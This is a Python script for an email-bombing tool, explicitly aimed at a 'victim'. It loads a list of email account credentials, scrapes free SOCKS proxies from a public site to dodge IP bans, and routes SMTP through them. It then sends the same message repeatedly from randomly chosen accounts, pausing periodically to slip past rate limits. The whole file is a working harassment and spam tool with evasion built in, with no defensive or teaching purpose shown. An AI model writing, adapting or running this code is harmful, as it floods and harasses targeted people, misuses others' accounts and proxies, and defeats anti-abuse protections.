import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socks
import asyncio
from bs4 import BeautifulSoup
import requests
import random
import json
import time
from tqdm import trange, tqdm



with open("__JSON FILE WITH EMAIL IDS__", 'r') as json_file:
    creds = json.loads(json_file.read())
    limiter = len(creds) * 10
to = [] # list recipient(s) here

proxies = []

async def spam(msg_obj, prox_indx = 0, error_count = 0, send_count = 0):

    if(error_count <= len(creds) * limiter): # kinda timeout
        try: #  check connection to proxy scraper
            print("Tunneling through proxy\n")
            if len(proxies) > 0:
                tunnel_route = proxies[0]
            else:
                await get_proxy()
                await spam(msg_obj)
            socks.set_default_proxy(socks.SOCKS4, tunnel_route[0], tunnel_route[1])
            socks.wrapmodule(smtplib) # tunnel email server through proxy
            
        except Exception as e: # not included in error count
            print(f'Connection Failed :: {e}')
            print("Retrying socket connection\n")
            proxies.pop(0)
            await spam(msg_obj)
        
        print("Choosing random credentials\n")
        login = random.choice(creds)
        
        msg_obj['From'] = login[0]
        
        print("Connecting to SMTP server\n")
        try:
            server = smtplib.SMTP('__SMTP_CLIENT_URL_', 587)
            server.ehlo() # host : local host o email server 
            server.starttls()
            server.login(login[0],login[1])
            server.set_debuglevel(1)
        
            print("Sending msg...\n")
            server.sendmail(login[0], to, msg_obj.as_string())
            
            if send_count % 3 == 0: # sleep after every 3 mails sent
                time.sleep(60)
            
            print(f"\nMessage sent to: {', '.join(to)}\n")
            
            await spam(msg_obj, error_count = error_count + 1, send_count= send_count + 1)

        except Exception as e:
            print(f"Trying new host :: {e}\n")
            await get_proxy()
            await spam(msg_obj, prox_indx + 1, error_count + 1)
    else:
        print("Ending spammer, may the victim rest in peace >:)")
        

async def get_proxy():
    """using proxies to prevent IP bans"""
    res = requests.get('https://www.socks-proxy.net/', headers={'User-Agent':'Mozilla/7.0'}, timeout=300) # scrape proxy site
    soup = BeautifulSoup(res.text,"lxml")
    proxies.clear()
    print("\nLoading proxies:")
    for i in trange(0, 4):
        item = soup.select("tbody tr")[i]
        host = item.select("td")[0].text
        port = int(item.select("td")[1].text)
        country = item.select("td")[3].text
        last_checked = item.select("td")[7].text
        print(f"Host: {host}\tPort: {port}\tCountry: {country}\tLast Checked: {last_checked}\n")
        proxies.append((host, port, country, last_checked))
    
if __name__ == "__main__":
    
    #   Begin creating msg obj
    message = MIMEMultipart()
    with open("email_content", encoding='utf8') as json_file:
        message_content = json.loads(json_file.read())
        message['Subject'] = message_content['Subject']
        message.attach(MIMEText(message_content['Body'], 'plain'))     
    message['To'] = ", ".join(to)
    
    print("Done creating message object\n")
    #   End creating msg obj
    
    #   Initiate spam
    loop = asyncio.get_event_loop()
    loop.run_until_complete(spam(message))
    

    
    
    

